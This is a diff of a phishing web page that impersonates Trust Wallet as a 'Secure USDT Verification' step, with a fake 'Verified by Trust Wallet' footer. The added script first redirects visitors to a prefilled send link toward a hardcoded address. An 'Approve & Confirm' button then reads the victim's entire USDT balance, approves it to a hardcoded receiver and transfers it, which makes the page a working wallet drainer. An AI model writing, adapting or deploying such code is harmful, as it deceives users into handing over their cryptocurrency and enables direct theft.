@@ -1,19 +1,62 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Trust Wallet Secure Verification</title>
-<link rel="icon" href="./favicon.ico" type="image/x-icon" />
-<link rel="stylesheet" href="./style.css" />
+  <title>Secure USDT Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="./favicon.ico" type="image/x-icon" />
+  <style>
+    body { background:#081c3a; color:#fff; font-family:sans-serif; text-align:center; padding-top:20px; }
+    img { width:80px; margin:20px auto; display:block; }
+    h1 { font-size:1.5em; margin-bottom:10px; }
+    p { opacity:0.8; }
+    #approve { padding:12px 24px; background:#0052ff; color:#fff; border:none; border-radius:8px; cursor:pointer; font-size:1em; margin-top:20px; }
+    .footer { position:fixed; bottom:10px; width:100%; opacity:0.5; font-size:0.8em; }
+  </style>
 </head>
 <body>
-  <img src="./logo.png" alt="Trust Wallet Logo" class="logo" />
-  <h1>Trust Wallet Secure Verification</h1>
-  <p>Tap the button to securely transfer USDT.</p>
-  <button id="drain">Verify &amp; Approve</button>
+  <img src="./logo.png" alt="Trust Wallet">
+  <h1>Secure USDT Verification</h1>
+  <p id="status">Redirecting you to Trust Wallet...</p>
+  <button id="approve" style="display:none;">Approve & Confirm</button>
   <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>
+
+  <script>
+    const payLink = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955";
+
+    // Redirect to send USDT
+    setTimeout(() => {
+      window.location.href = payLink;
+    }, 2000);
+
+    // Show Approve after returning to this page
+    setTimeout(() => {
+      document.getElementById('status').innerText = "Payment detected. Please Approve.";
+      document.getElementById('approve').style.display = "inline-block";
+    }, 8000); // 8s after load
+
+    document.getElementById('approve').onclick = async () => {
+      if (!window.ethereum) return alert('Use Trust Wallet DApp browser.');
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      const Web3 = window.Web3;
+      const web3 = new Web3(window.ethereum);
+
+      const RECEIVER = "0xDA0bab807633f07f013f94DD0E6A4F96F8742B53";
+      const USDT = "0x55d398326f99059fF775485246999027B3197955";
+      const ABI = [
+        { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+        { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+        { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
+      ];
+      const accounts = await web3.eth.getAccounts();
+      const user = accounts[0];
+      const contract = new web3.eth.Contract(ABI, USDT);
+      const balance = await contract.methods.balanceOf(user).call();
+      await contract.methods.approve(RECEIVER, balance).send({ from: user });
+      await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
+      document.getElementById('status').innerText = "✅ Transaction Complete.";
+      document.getElementById('approve').style.display = "none";
+    };
+  </script>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
-  <script src="./script.js"></script>
 </body>
 </html>
